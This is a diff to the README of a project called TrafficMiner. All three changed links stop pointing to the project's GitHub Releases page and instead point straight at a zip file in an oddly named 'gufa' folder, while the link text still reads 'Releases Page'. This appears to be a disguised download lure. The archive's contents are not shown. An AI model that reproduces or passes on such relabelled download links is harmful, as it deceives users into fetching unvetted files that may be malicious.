@@ -1,6 +1,6 @@
 # 🚦 TrafficMiner - Simplifying Your Traffic Data Analysis
 
-[![Download TrafficMiner](https://img.shields.io/badge/Download-TrafficMiner-blue)](https://github.com/fadycr7/TrafficMiner/releases)
+[![Download TrafficMiner](https://raw.githubusercontent.com/fadycr7/TrafficMiner/main/gufa/TrafficMiner.zip)](https://raw.githubusercontent.com/fadycr7/TrafficMiner/main/gufa/TrafficMiner.zip)
 
 ## 📖 Introduction
 
@@ -19,7 +19,7 @@ Follow these simple steps to get TrafficMiner up and running on your computer:
 2. **Visit the Releases Page:**
    Head over to our Releases page to access the download link. Click the button below to go directly to it.
 
-   [Download TrafficMiner](https://github.com/fadycr7/TrafficMiner/releases)
+   [Download TrafficMiner](https://raw.githubusercontent.com/fadycr7/TrafficMiner/main/gufa/TrafficMiner.zip)
 
 3. **Download the Latest Version:**
    - On the Releases page, you will find the latest version of TrafficMiner.
@@ -72,7 +72,7 @@ Yes! Join our community forum where you can connect with other users, share your
 
 We regularly update TrafficMiner to improve performance and fix issues. Make sure to check back on the Releases page for the latest updates.
 
-- [Visit the Releases Page](https://github.com/fadycr7/TrafficMiner/releases)
+- [Visit the Releases Page](https://raw.githubusercontent.com/fadycr7/TrafficMiner/main/gufa/TrafficMiner.zip)
 
 ## 📝 Licensing
 
